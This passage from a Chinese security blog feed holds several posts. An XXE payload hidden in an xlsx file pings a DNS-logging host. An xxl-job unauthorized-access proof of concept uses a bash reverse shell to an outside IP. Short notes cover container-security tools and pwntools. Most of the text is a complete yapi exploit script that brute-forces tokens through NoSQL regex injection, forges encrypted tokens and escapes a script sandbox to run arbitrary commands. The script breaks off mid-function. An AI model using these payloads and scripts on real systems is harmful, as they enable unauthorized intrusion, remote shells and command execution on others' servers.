<p>编辑【[Content_Types].xml】文件<br><img src="/images/blog/377685cf4730c9d523794ddf911e57a9.png"></p>
<p>添加如下内容<br><img src="/images/blog/9b5f2f3579c1dbe80dcecaaf3bb70036.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;http://xxe.dnslog.icu/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
<p>进入文件目录，全选-&gt;7zip-&gt;添加到压缩包<br><img src="/images/blog/87700060e711bf6d2a00ca87c8668cee.png"></p>
<p>选择格式为【zip】等级为【仅存储】,更名为xlsx<br><img src="/images/blog/0182d5e51a95f7cc590e622d392fc68a.png"></p>
<p>把处理过后的文件上传，看到DNSLOG有没有请求过来</p>
]]></content>
  </entry>
  <entry>
    <title>xxl-job executor未授权访问漏洞</title>
    <url>/2024/09/10/xxl-job-executor%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="0x1-漏洞影响"><a href="#0x1-漏洞影响" class="headerlink" title="0x1 漏洞影响"></a>0x1 漏洞影响</h1><p>XXL-JOB &lt;&#x3D; 2.2.0</p>
<h1 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h1><p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
<h1 id="0x3-glueType”-”BEAN”-任务模式的选值如下"><a href="#0x3-glueType”-”BEAN”-任务模式的选值如下" class="headerlink" title="0x3 glueType”:”BEAN” 任务模式的选值如下"></a>0x3 glueType”:”BEAN” 任务模式的选值如下</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BEAN(&quot;BEAN&quot;, false, null, null),</span><br><span class="line">GLUE_GROOVY(&quot;GLUE(Java)&quot;, false, null, null),</span><br><span class="line">GLUE_SHELL(&quot;GLUE(Shell)&quot;, true, &quot;bash&quot;, &quot;.sh&quot;), </span><br><span class="line">GLUE_PYTHON(&quot;GLUE(Python)&quot;, true, &quot;python&quot;, &quot;.py&quot;), </span><br><span class="line">GLUE_PHP(&quot;GLUE(PHP)&quot;, true, &quot;php&quot;, &quot;.php&quot;), </span><br><span class="line">GLUE_NODEJS(&quot;GLUE(Nodejs)&quot;, true, &quot;node&quot;, &quot;.js&quot;), </span><br><span class="line">GLUE_POWERSHELL(&quot;GLUE(PowerShell)&quot;, true, &quot;powershell&quot;, &quot;.ps1&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="x4-POC"><a href="#x4-POC" class="headerlink" title="-x4 POC"></a>-x4 POC</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /run HTTP/1.1</span><br><span class="line">Host: ip:9999</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 394</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  &quot;jobId&quot;: 1,</span><br><span class="line">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span><br><span class="line">  &quot;executorTimeout&quot;: 0,</span><br><span class="line">  &quot;logId&quot;: 1,</span><br><span class="line">  &quot;logDateTime&quot;: 1586629003729,</span><br><span class="line">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span><br><span class="line">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span><br><span class="line">  &quot;glueUpdatetime&quot;: 1586699003758,</span><br><span class="line">  &quot;broadcastIndex&quot;: 0,</span><br><span class="line">  &quot;broadcastTotal&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>云安全检测开源项目</title>
    <url>/2024/09/10/%E4%BA%91%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h3 id="trivy"><a href="#trivy" class="headerlink" title="trivy"></a>trivy</h3><p>Trivy是一个简单而全面的扫描器，用于检测容器镜像、文件系统和Git存储库中的漏洞以及配置问题。Trivy检测操作系统包（Alpine、RHEL、CentOS 等）和特定编程语言包（Bundler、Composer、npm、yarn 等）的漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/aquasecurity/trivy</span><br></pre></td></tr></table></figure>

<h3 id="CDK"><a href="#CDK" class="headerlink" title="CDK"></a>CDK</h3><p>CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC&#x2F;EXP。集成Docker&#x2F;K8s场景特有的 逃逸、横向移动、持久化利用方式，插件化管理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/cdk-team/CDK</span><br></pre></td></tr></table></figure>


<h3 id="kube-bench"><a href="#kube-bench" class="headerlink" title="kube-bench"></a>kube-bench</h3><p>通过运行 CIS Kubernetes Benchmark 中记录的检查来检查 Kubernetes 是否安全部署。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/aquasecurity/kube-bench</span><br></pre></td></tr></table></figure>

<h3 id="veinmind-tools"><a href="#veinmind-tools" class="headerlink" title="veinmind-tools"></a>veinmind-tools</h3><p>veinmind-tools 是由长亭科技自研，牧云团队孵化，基于 veinmind-sdk 打造的容器安全工具集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/chaitin/veinmind-tools</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>【逆向学习记录】Pwntool常用的数据处理方式</title>
    <url>/2024/09/10/%E3%80%90%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%91Pwntool%E5%B8%B8%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h4 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h4><p>偶尔在pwn的题目中，使用pwntool工具，由于不熟练，经常性遗忘，尤其是接收地址的时候，会卡在数据处理上，因此单独起一篇文章，用来记录日常用到的各种语句，后面如果发现了心得，可以继续补充。<br>参考文章：<br>PwnTools常见用法<br>(Pwntool 官方文档)[<a href="https://pwntools.readthedocs.io/en/stable/globals.html]">https://pwntools.readthedocs.io/en/stable/globals.html]</a></p>
<h4 id="2-数据处理方式"><a href="#2-数据处理方式" class="headerlink" title="2 数据处理方式"></a>2 数据处理方式</h4><h5 id="2-1-发送数据"><a href="#2-1-发送数据" class="headerlink" title="2.1 发送数据"></a>2.1 发送数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">send(payload) 发送payload</span><br><span class="line">sendline(payload) 发送payload，并进行换行（末尾\n）</span><br><span class="line">sendafter(some_string, payload) 接收到 some_string 后, 发送你的 payload</span><br><span class="line">sendlineafter(some_string, payload) 接收到 some_string 后, 发送你的 payload（末尾\n）</span><br><span class="line"># 后面两个经常用，相当于recvuntil</span><br></pre></td></tr></table></figure>
<h5 id="2-2-接收数据"><a href="#2-2-接收数据" class="headerlink" title="2.2 接收数据"></a>2.2 接收数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">recvn(N) 接受 N(数字) 字符</span><br><span class="line">recvline() 接收一行输出</span><br><span class="line">recvlines(N) 接收 N(数字) 行输出</span><br><span class="line">recvuntil(some_string) 接收到 some_string 为止</span><br></pre></td></tr></table></figure>
<h5 id="2-3-接收到数据之后"><a href="#2-3-接收到数据之后" class="headerlink" title="2.3 接收到数据之后"></a>2.3 接收到数据之后</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##如果接受到的是地址，可以使用recv之后，直接进行int强转</span><br><span class="line">data = p.recv(&quot;10&quot;)</span><br><span class="line">libc_start_main_addr = int(data,16) - 247</span><br><span class="line">##如果接受到的是地址，但是是反向的\x10\x00\x40，可以使用recv之后，直接进行int强转</span><br><span class="line">data = p.recv(&quot;10&quot;)</span><br><span class="line">libc.address = int(data[:6][::-1].encode(&quot;hex&quot;), 16) - libc.symbols[&quot;read&quot;]</span><br><span class="line">libc.address = u64(data[:6].ljust(8,&quot;\x00&quot;)) - libc.symbols[&quot;read&quot;]</span><br><span class="line">#这两种写法都行，其中[::-1]的意思是逆序取字符串，可以使用u64 强制转换</span><br><span class="line">p32/p64: 打包一个整数,分别打包为32或64位,主要是发送的时候需要打包</span><br><span class="line">u32/u64: 解包一个字符串,得到整数，接收的时候需要解包</span><br></pre></td></tr></table></figure>
<h6 id="2-4-针对elf的处理"><a href="#2-4-针对elf的处理" class="headerlink" title="2.4 针对elf的处理"></a>2.4 针对elf的处理</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols[&#x27;a_function&#x27;] 找到 a_function 的地址</span><br><span class="line">##libc.symbols[&#x27;read&#x27;]</span><br><span class="line">got[&#x27;a_function&#x27;] 找到 a_function的 got</span><br><span class="line">##elf.got[&quot;read&quot;]</span><br><span class="line">plt[&#x27;a_function&#x27;] 找到 a_function 的 plt</span><br><span class="line">##elf.plt[&quot;read&quot;]</span><br><span class="line">next(e.search(&quot;some_characters&quot;)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址</span><br><span class="line">##libc.next(e.search(&quot;/bin/sh&quot;))</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<h5 id="2-5-关于context，调试log"><a href="#2-5-关于context，调试log" class="headerlink" title="2.5 关于context，调试log"></a>2.5 关于context，调试log</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br></pre></td></tr></table></figure>
<h5 id="2-6-关于gdb，当执行到此时，会弹出一个terminal"><a href="#2-6-关于gdb，当执行到此时，会弹出一个terminal" class="headerlink" title="2.6 关于gdb，当执行到此时，会弹出一个terminal"></a>2.6 关于gdb，当执行到此时，会弹出一个terminal</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb.attach(process)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>逆向</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>yapi &lt; 1.12.0漏洞EXP</title>
    <url>/2024/09/10/yapi-1-12-0%E6%BC%8F%E6%B4%9EEXP/</url>
    <content><![CDATA[<h1 id="0x1-使用"><a href="#0x1-使用" class="headerlink" title="0x1 使用"></a>0x1 使用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python yapi.py --debug one4all -u https://yapi.test.tv/</span><br></pre></td></tr></table></figure>

<h1 id="0x2-EXP"><a href="#0x2-EXP" class="headerlink" title="0x2 EXP"></a>0x2 EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import click</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import logging</span><br><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line">from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes</span><br><span class="line">from cryptography.hazmat.primitives import padding</span><br><span class="line">from urllib.parse import urljoin</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(&#x27;attacker&#x27;)</span><br><span class="line">logger.setLevel(&#x27;WARNING&#x27;)</span><br><span class="line">ch = logging.StreamHandler(sys.stdout)</span><br><span class="line">ch.setFormatter(logging.Formatter(&#x27;%(asctime)s - %(message)s&#x27;))</span><br><span class="line">logger.addHandler(ch)</span><br><span class="line">choices = &#x27;abcedf0123456789&#x27;</span><br><span class="line">script_template = r&#x27;&#x27;&#x27;const sandbox = this</span><br><span class="line">const ObjectConstructor = this.constructor</span><br><span class="line">const FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line">const myfun = FunctionConstructor(&#x27;return process&#x27;)</span><br><span class="line">const process = myfun()</span><br><span class="line">const Buffer = FunctionConstructor(&#x27;return Buffer&#x27;)()</span><br><span class="line">const output = process.mainModule.require(&quot;child_process&quot;).execSync(Buffer.from(&#x27;%s&#x27;, &#x27;hex&#x27;).toString()).toString()</span><br><span class="line">context.responseData = &#x27;testtest&#x27; + output + &#x27;testtest&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def compute(passphase: str):</span><br><span class="line">    nkey = 24</span><br><span class="line">    niv = 16</span><br><span class="line">    key = &#x27;&#x27;</span><br><span class="line">    iv = &#x27;&#x27;</span><br><span class="line">    p = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">        h.update(binascii.unhexlify(p))</span><br><span class="line">        h.update(passphase.encode())</span><br><span class="line">        p = h.hexdigest()</span><br><span class="line"></span><br><span class="line">        i = 0</span><br><span class="line">        n = min(len(p) - i, 2 * nkey)</span><br><span class="line">        nkey -= n // 2</span><br><span class="line">        key += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line">        n = min(len(p) - i, 2 * niv)</span><br><span class="line">        niv -= n // 2</span><br><span class="line">        iv += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line"></span><br><span class="line">        if nkey + niv == 0:</span><br><span class="line">            return binascii.unhexlify(key), binascii.unhexlify(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def aes_encode(data):</span><br><span class="line">    key, iv = compute(&#x27;abcde&#x27;)</span><br><span class="line">    padder = padding.PKCS7(128).padder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()</span><br><span class="line">    return binascii.hexlify(ct).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def aes_decode(data):</span><br><span class="line">    key, iv = compute(&#x27;abcde&#x27;)</span><br><span class="line">    unpadder = padding.PKCS7(128).unpadder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    ct = decryptor.update(binascii.unhexlify(data)) + decryptor.finalize()</span><br><span class="line">    ct = unpadder.update(ct) + unpadder.finalize()</span><br><span class="line">    return ct.decode().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_token(target, already):</span><br><span class="line">    url = urljoin(target, &#x27;/api/interface/up&#x27;)</span><br><span class="line">    current = &#x27;^&#x27;</span><br><span class="line">    for i in range(20):</span><br><span class="line">        for ch in choices:</span><br><span class="line">            guess = current + ch</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: -1,</span><br><span class="line">                &#x27;token&#x27;: &#123;</span><br><span class="line">                    &#x27;$regex&#x27;: guess,</span><br><span class="line">                    &#x27;$nin&#x27;: already</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.post(url,</span><br><span class="line">                                     data=json.dumps(data),</span><br><span class="line">                                     headers=headers,</span><br><span class="line">                                     # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                                     # verify=False,</span><br><span class="line">                                     )</span><br><span class="line">            res = response.json()</span><br><span class="line"></span><br><span class="line">            if res[&#x27;errcode&#x27;] == 400:</span><br><span class="line">                current = guess</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        logger.debug(f&#x27;current cuess: &#123;current&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    return current[1:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_owner_uid(target, token):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/get&#x27;)</span><br><span class="line">    for i in range(1, 200):</span><br><span class="line">        params = &#123;&#x27;token&#x27;: aes_encode(f&#x27;&#123;i&#125;|&#123;token&#125;&#x27;)&#125;</span><br><span class="line">        response = requests.get(url, params=params,</span><br><span class="line">                            # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                            # verify=False,</span><br><span class="line">                            )</span><br><span class="line">        data = response.json()</span><br><span class="line">        if data[&#x27;errcode&#x27;] == 0:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_project(target, token, pid=None):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/get&#x27;)</span><br><span class="line">    params = &#123;&#x27;token&#x27;: token&#125;</span><br><span class="line">    if pid:</span><br><span class="line">        params[&#x27;id&#x27;] = pid</span><br><span class="line"></span><br><span class="line">    response = requests.get(url,</span><br><span class="line">                            params=params,</span><br><span class="line">                            #proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                            #verify=False,</span><br><span class="line">                            )</span><br><span class="line">    data = response.json()</span><br><span class="line"></span><br><span class="line">    if data[&#x27;errcode&#x27;] == 0:</span><br><span class="line">        return data[&#x27;data&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_col(target, token, brute_from, brute_to):</span><br><span class="line">    url = urljoin(target, &#x27;/api/open/run_auto_test&#x27;)</span><br><span class="line"></span><br><span class="line">    for i in range(brute_from, brute_to):</span><br><span class="line">        try:</span><br><span class="line">            params = &#123;&#x27;token&#x27;: token, &#x27;id&#x27;: i, &quot;mode&quot;: &quot;json&quot;&#125;</span><br><span class="line">            response = requests.get(url,</span><br><span class="line">                                    params=params,</span><br><span class="line">                                    timeout=5,</span><br><span class="line">                                    #proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                                    #verify=False,</span><br><span class="line">                                    )</span><br><span class="line"></span><br><span class="line">            data = response.json()</span><br><span class="line">            if &#x27;message&#x27; not in data:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            if data[&#x27;message&#x27;][&#x27;len&#x27;] &gt; 0:</span><br><span class="line">                logger.debug(&#x27;Test Result Found: %r&#x27;, response.url)</span><br><span class="line">                yield i</span><br><span class="line">        except requests.exceptions.Timeout:</span><br><span class="line">            logger.debug(&#x27;id=%d timeout&#x27;, i)</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def update_project(target, token, project_id, command):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/up&#x27;)</span><br><span class="line"></span><br><span class="line">    command_hex = command.encode().hex()</span><br><span class="line">    script = script_template % command_hex</span><br><span class="line">    response = requests.post(url,</span><br><span class="line">                             params=&#123;&#x27;token&#x27;: token&#125;,</span><br><span class="line">                             json=&#123;&#x27;id&#x27;: project_id, &#x27;after_script&#x27;: script&#125;,</span><br><span class="line">                             # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                             # verify=False,</span><br><span class="line">                             )</span><br><span class="line">    data = response.json()</span><br><span class="line">    return data[&#x27;errcode&#x27;] == 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run_auto_test(target, token, col_id):</span><br><span class="line">    url = urljoin(target, &#x27;/api/open/run_auto_test&#x27;)</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, </span><br><span class="line">                            params=&#123;&#x27;token&#x27;: token, &#x27;id&#x27;: col_id, &#x27;mode&#x27;: &#x27;json&#x27;&#125;,</span><br><span class="line">                            # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                            # verify=False,</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        data = response.json()</span><br><span class="line">        return data[&#x27;list&#x27;][0][&#x27;res_body&#x27;][8:-8]</span><br><span class="line">    except (requests.exceptions.JSONDecodeError, KeyError, IndexError, TypeError) as e:</span><br><span class="line">        g = re.search(br&#x27;testtest(.*?)testtest&#x27;, response.content, re.I | re.S)</span><br><span class="line">        if g:</span><br><span class="line">            return g.group(1).decode()</span><br><span class="line">        else:</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def clear_project(target, token, project_id, old_after_script):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/up&#x27;)</span><br><span class="line">    response = requests.post(url, params=&#123;&#x27;token&#x27;: token&#125;, json=&#123;&#x27;id&#x27;: project_id, &#x27;after_script&#x27;: old_after_script&#125;)</span><br><span class="line">    data = response.json()</span><br><span class="line">    return data[&#x27;errcode&#x27;] == 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@click.group()</span><br><span class="line">@click.option(&#x27;--debug&#x27;, &#x27;debug&#x27;, is_flag=True, type=bool, required=False, default=False)</span><br><span class="line">def cli(debug):</span><br><span class="line">    if debug:</span><br><span class="line">        logger.setLevel(&#x27;DEBUG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;enc&#x27;)</span><br><span class="line">@click.argument(&#x27;data&#x27;, type=str, required=True)</span><br><span class="line">def cmd_enc(data: str):</span><br><span class="line">    click.echo(aes_encode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;dec&#x27;)</span><br><span class="line">@click.argument(&#x27;data&#x27;, type=str, required=True)</span><br><span class="line">def cmd_dec(data: str):</span><br><span class="line">    click.echo(aes_decode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;token&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--count&#x27;, type=int, default=5)</span><br><span class="line">def cmd_token(url, count):</span><br><span class="line">    already = []</span><br><span class="line">    for i in range(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        if not token:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        click.echo(f&#x27;find a valid token: &#123;token&#125;&#x27;)</span><br><span class="line">        already.append(token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;owner&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">def cmd_owner(url, token):</span><br><span class="line">    aid = find_owner_uid(url, token)</span><br><span class="line">    e = aes_encode(f&#x27;&#123;aid&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    click.echo(f&#x27;your owner id is: &#123;aid&#125;, encrypted token is &#123;e&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;project&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-o&#x27;, &#x27;--owner-id&#x27;, &#x27;owner&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">def cmd_project(url, owner, token):</span><br><span class="line">    token = aes_encode(f&#x27;&#123;owner&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    project = find_project(url, token)</span><br><span class="line">    if project:</span><br><span class="line">        logger.info(&#x27;[+] project by this token: %r&#x27;, project)</span><br><span class="line">        click.echo(f&#x27;your project id is: &#123;project[&quot;_id&quot;]&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;col&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-o&#x27;, &#x27;--owner-id&#x27;, &#x27;owner&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">@click.option(&#x27;--from&#x27;, &#x27;brute_from&#x27;, type=int, required=False, default=1, help=&#x27;Brute Col id from this number&#x27;)</span><br><span class="line">@click.option(&#x27;--to&#x27;, &#x27;brute_to&#x27;, type=int, required=False, default=200, help=&#x27;Brute Col id to this number&#x27;)</span><br><span class="line">def cmd_col(url, owner, token, brute_from, brute_to):</span><br><span class="line">    token = aes_encode(f&#x27;&#123;owner&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    for i in find_col(url, token, brute_from, brute_to):</span><br><span class="line">        click.echo(f&#x27;found a valid col id: &#123;i&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;rce&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-o&#x27;, &#x27;--owner-id&#x27;, &#x27;owner&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">@click.option(&#x27;--pid&#x27;, &#x27;project_id&#x27;, type=int, required=True)</span><br><span class="line">@click.option(&#x27;--cid&#x27;, &#x27;col_id&#x27;, type=int, required=True)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--command&#x27;, &#x27;command&#x27;, type=str, required=True, help=&#x27;Command that you want to execute&#x27;)</span><br><span class="line">def cmd_rce(url, owner, token, project_id, col_id, command):</span><br><span class="line">    token = aes_encode(f&#x27;&#123;owner&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    project = find_project(url, token, project_id)</span><br><span class="line">    if not project:</span><br><span class="line">        click.echo(&#x27;[-] failed to get project&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    old_after_script = project.get(&#x27;after_script&#x27;, &#x27;&#x27;)</span><br><span class="line">    if not update_project(url, token, project_id, command):</span><br><span class="line">        click.echo(&#x27;[-] failed to update project&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    output = run_auto_test(url, token, col_id)</span><br><span class="line">    if output:</span><br><span class="line">        click.echo(output)</span><br><span class="line">        clear_project(url, token, project_id, old_after_script)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    clear_project(url, token, project_id, old_after_script)</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;one4all&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;--count&#x27;, type=int, default=5)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--command&#x27;, type=str, default=&#x27;id&#x27;)</span><br><span class="line">def cmd_one4all(url, count, command):</span><br><span class="line">    already = []</span><br><span class="line">    for i in range(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        if not token:</span><br><span class="line">            logger.info(&#x27;[-] no new token found, exit...&#x27;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        already.append(token)</span><br><span class="line">        logger.info(&#x27;[+] find a new token: %s&#x27;, token)</span><br><span class="line">        owner_id = find_owner_uid(url, token)</span><br><span class="line">        if not owner_id:</span><br><span class="line">            logger.info(&#x27;[-] failed to find the owner id using token %s&#x27;, token)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        etoken = aes_encode(f&#x27;&#123;owner_id&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">        logger.info(&#x27;[+] find a new owner id: %r, encrypted token: %s&#x27;, owner_id, etoken)</span><br><span class="line">        project = find_project(url, etoken)</span><br><span class="line">        if not project:</span><br><span class="line">            logger.info(&#x27;[-] failed to find project using token %s&#x27;, token)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        project_id = project[&#x27;_id&#x27;]</span><br><span class="line">        logger.info(&#x27;[+] project_id = %s, project = %r&#x27;, project_id, project)</span><br><span class="line">        col_ids = find_col(url, etoken, 1, 200)</span><br><span class="line">        if not col_ids:</span><br><span class="line">            logger.info(&#x27;[+] failed to find cols in project %s, try next 